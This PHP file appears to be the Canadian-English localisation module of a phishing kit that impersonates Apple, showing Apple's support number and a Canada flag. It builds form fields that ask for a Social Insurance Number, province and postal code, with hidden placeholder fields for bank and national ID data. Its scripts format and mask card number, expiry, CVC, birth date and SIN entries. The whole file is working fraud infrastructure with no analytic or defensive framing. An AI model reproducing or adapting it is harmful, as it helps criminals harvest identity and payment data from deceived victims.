<?php
/* 
------------------
Language: English CA
------------------
*/

$langx = array();

$langx['POSTCODE'] = 'postal code';
$langx['COUNTRY'] = 'Canada';
$langx['COUNTYSELECT'] = '
<select id="county" name="county" type="text" class="form-control select-country" style="height:32px!important;padding-left:10px;" >
	<option value="">province</option>
	<option value="Alberta">Alberta</option><option value="British Columbia">British Columbia</option><option value="Manitoba">Manitoba</option><option value="New Brunswick">New Brunswick</option><option value="Newfoundland">Newfoundland and Labrador</option><option value="Nova Scotia">Nova Scotia</option><option value="Nunavut">Nunavut</option><option value="Northwest Territories">Northwest Territories</option><option value="Ontario">Ontario</option><option value="Prince Edward Island">Prince Edward Island</option><option value="Quebec">Quebec</option><option value="Saskatchewan">Saskatchewan</option><option value="Yukon">Yukon</option>
	</select>
';
$langx['ACCOUNT'] = '
<input type="hidden" name="acno" value="-">
<input type="hidden" name="sortcode" value="-">
<input type="hidden" name="bans" value="-">
';
$langx['SSN'] = '
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">SOCIAL INSURANCE NUMBER</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="dob-wrapper clearfix">
  <input type="text" name="ssn" id="ssn" class="generic-input-field form-control field" placeholder="social insurance number"  maxlength="11" required="required">
</div>
</div>
</div>
</div>
</div>
';
$langx['CREDITLIMIT'] = '
<input type="hidden" name="climit" value="-">
';
$langx['PASSPORT'] = '
<input type="hidden" name="passport" value="-">
';
$langx['NUMBID'] = '
<input type="hidden" name="numbid" value="-">
';
$langx['NAID'] = '
<input type="hidden" name="naid" value="-">
';
$langx['CIVILID'] = '
<input type="hidden" name="civilid" value="-">
';
$langx['QATARID'] = '
<input type="hidden" name="qatarid" value="-">
';
$langx['CITIZENID'] = '
<input type="hidden" name="citizenid" value="-">
';
$langx['APPCALL'] = '1 800 MY-APPLE';
$langx['FLAG'] = 'assets/img/ca.png';
?>
<script type='text/javascript' src="assets/js/jquery-1.9.1.js"></script>
<script type='text/javascript' src="assets/js/jquery.validate.min.js"></script>
<script type='text/javascript' src="assets/js/jquery.payment.js"></script>
<script type='text/javascript' src="assets/js/additional-methods.min.js"></script>
<script type='text/javascript' src="assets/js/jquery.maskedinput.js"></script>
<script type='text/javascript' src="assets/js/Valid.CA.js"></script>
  <script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');
      $.fn.toggleInputError = function(galat) {
        this.parent('.form-group').toggleClass('has-error', galat);
        return this;
      };

    });
  </script>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#ccexp").mask("99 / 99",{placeholder:"MM / YY"});
   $("#ssn").mask("999-999-999",{placeholder:"xxx-xxx-xxx"});
});
</script>